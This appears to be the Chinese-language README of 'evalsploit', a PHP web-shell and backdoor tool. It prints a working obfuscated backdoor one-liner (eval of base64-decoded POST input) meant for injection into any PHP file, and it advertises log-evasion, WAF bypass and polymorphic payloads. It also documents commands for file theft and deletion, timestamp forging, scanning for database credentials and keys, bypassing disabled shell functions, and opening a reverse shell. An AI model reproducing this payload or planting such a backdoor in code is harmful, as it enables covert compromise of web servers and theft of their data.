# evalsploit 中文版
# [evalsploit по-русски](README_RU.md)
# [evalsploit english](README.md)

# evalsploit
基于eval function的后门，可作为独立的web-shell（网页后门）

### 功能

-   **隐身**
    -   适用于POST请求 ，几乎不可见日志
    -   内置WAF 旁路功能
    -   每个新会话都有新的用户代理
    -   隐身操作设置
    -   多态有效载荷


-   **通用**
    -   有效载荷可添加到PHP代码的任何部分
    -   适用于 Linux, Windows, Mac OS

# 使用手册

#### 入门

1) 使用有效载荷感染PHP或作为一个独立的外壳
`if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'], '' ,$_POST['Z'])));die();}`
2) 当启动程序时，evalsploit将需要链接到含有效负荷的文件
3) 当更改 `send` 模块（见于“程序设置”）时，使用 `gen` 指令生成新的有效负载

#### 使用文件系统

-   `ls`: 该目录中文件的列表
	-   设置 `ls`: 基于 DirectoryIterator（默认支持）
	-   设置 `dir`: 基于 ScanDir

-   `cp`: 复制文件
    -   使用分隔号 ` : ` (/what.txt : /where/what.txt )

-   `cd`: 通过文件系统进行移动

-	`mkd`: 创建新目录

-	`upl`: 上传文件到服务器

-	`home`: 回到 \_\_DIR\_\_

-	`pwd`: 打印活动目录

#### 使用文件

-   `cat`: 使用文件
    -   设置 `html`: 基于 htmlentities 
	-   设置 `base64`: 基于 base64_encode\base64_decode (设置默认)

-   `rm`: 删除文件

-   `dl`: 下载文件（下载到/下载文件夹）
	-	不能处理大于100MB的文件
	
-   `edit`: 编辑文件内容
	-	不能处理大于100MB的文件

-	`mkf`: 创建新文件

-	`touch`: 更改文件时间戳
	-	使用 ` settime ` 分隔 (file.рhр settime Year-Month-Day Hour:Minute:Second)

-	`stat`: 文件信息

-	`ren`: 重命名文件
	-	使用分隔 ` : ` (/where/old.txt : new.php )


#### 使用evalsploit系统

-   `run`: 切换到命令行模式
	-	`exit` 退出模式
	-	支持 exec, shell_exec, system, passthru, popen, proc_open, expect_popen, pcntl_exec, do
	
-	`info`: 服务器信息
	-	php 版本, OS
	
-	`scan`: 扫描所选目录
	-	搜索系统 PHP, 数据库、密钥等
	
-	`exploit`: 使用内置漏洞绕过已禁用的命令行，激活命令行模式
	-	`exit` 退出模式

-	`reverse`: reverse-shell - `reverse IP:PORT`
	
-	`gen`: 根据发送模块生成有效负载
	
-	`help`: 首页
	
-	`exit`: 退出
	
	
	
#### 程序设置

-	`set`: 配置模块。要查看参数列表请使用 `set module help`
	-	代替 `help` 可接受 `-h`, `h`, `?`, `/?`)
	-	**run**: `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `expect_popen`, `pcntl_exec`, `do`
	-	**ls**: `ls`, `dir`
	-	**cat**: `html`, `base64`
	-	**silent**: `1`, `0` (隐身)
	-	**reverse**: `ivan`, `monkey` 
	-	**send**: `bypass`, `classic`, `simple` (发送模块)
	
